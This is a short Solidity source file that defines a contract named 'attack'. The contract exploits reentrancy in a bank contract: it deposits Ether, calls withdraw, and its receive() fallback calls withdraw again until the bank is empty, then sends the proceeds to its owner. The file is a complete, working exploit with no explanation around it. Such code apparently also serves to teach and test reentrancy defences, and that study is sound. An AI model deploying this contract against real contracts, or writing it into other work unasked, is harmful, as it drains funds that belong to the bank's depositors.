// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBank{
    function deposit() external payable; 
    function withdraw() external;
}

contract attack{
      IBank public immutable mybank;
      address public owner;

      constructor (address bankaddress){
          mybank = IBank(bankaddress);
          owner = msg.sender;
      }

      function attack() external payable
      {
          mybank.deposit{value: msg.value}();
          mybank.withdraw();
      }
    
      receive() external payable {
          if(address(mybank).balance > 0)
              mybank.withdraw();
          else
              payable(owner).transfer(address(this).balance);          
      }
}
